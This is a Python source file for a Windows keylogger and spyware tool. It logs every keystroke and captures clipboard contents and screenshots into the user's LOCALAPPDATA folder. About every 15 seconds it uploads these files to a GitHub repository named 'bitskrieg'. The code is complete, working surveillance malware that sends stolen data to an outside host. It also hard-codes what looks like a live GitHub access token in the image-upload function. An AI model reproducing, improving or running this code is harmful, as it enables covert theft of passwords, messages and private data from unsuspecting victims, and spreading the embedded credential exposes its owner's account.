from pynput.keyboard import Key,Listener
import os
import win32clipboard
from PIL import ImageGrab
import time
from github import Github


file_path=(os.getenv('LOCALAPPDATA'))
time_iter=15
no_of_iter=0
no_of_iter_end=3
currenttime=time.time()
stoppingtime=time.time()+time_iter

def git(loc, type):
    repo_name = "bitskrieg"
    g = Github("ACCESS TOKEN TO BE GIVEN") #I have removed my access token user can add his token

    repo = g.get_user().get_repo(repo_name)
    commit_message = "Updated file"
    file1=file_path+"//"+loc
    with open(file1, "r") as file:
        file_content = file.read()
    try:
        file_in_repo = repo.get_contents(type)
        repo.update_file(
            file_in_repo.path,  # Path of the existing file
            commit_message,     # Commit message
            file_content,       
            file_in_repo.sha    # SHA of the existing file
        )
    except Exception as e:
        try:
            repo.create_file(
                type,             
                commit_message,    
                bytes(file_content)       
            )
        except Exception as create_error:
            pass

def gitimg(locimg,typeimg):
    repo_name = "bitskrieg"
    g = Github("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")
    repo = g.get_user().get_repo(repo_name)
    file1=file_path+"//"+locimg
    with open(file1, "rb") as image:
        f = image.read()
        image_data = bytearray(f)
    try:    
        repo.create_file(
                    typeimg,'commit',bytes(image_data))
    except:
        pass

def copyclipboard():
    try:
        with open(file_path+"//"+"clipboard.txt",'a')  as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data=win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("clipboard data: \n"+pasted_data)
            except:
                pass
    except:
        with open(file_path+"//"+"clipboard.txt",'w')  as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data=win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("clipboard data: \n"+pasted_data)
            except:
                pass
def screenshot():
    im=ImageGrab.grab()
    im.save(file_path+"//"+"screenshot.png")
while True:
    count = 0
    keys=[]
    def on_press(key):
        global keys,count,currenttime
        currenttime=time.time()
        keys.append(key)
        count+=1
        if count>=1:
            count=0
            write_file(keys)
            keys=[]
    def write_file(keys):
        try:
            with open(file_path+"//"+"log.txt",'a')  as f:
                for key in keys:
                    k=str(key).replace("'","") 
                    f.write(k) 
        except:
            with open(file_path+"//"+"logger.txt",'w')  as f:
                for key in keys:
                    k=str(key).replace("'","")
                    f.write(k)
    def on_release(key):
        if currenttime>stoppingtime:
            return False
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
    if currenttime>stoppingtime:
        screenshot()
        copyclipboard()
        git('log.txt','log.txt')
        gitimg('screenshot.png','screenshot'+str(no_of_iter)+'.png')
        git('clipboard.txt',"clipboard.txt")
        no_of_iter+=1
        currenttime=time.time()
        stoppingtime=time.time()+time_iter

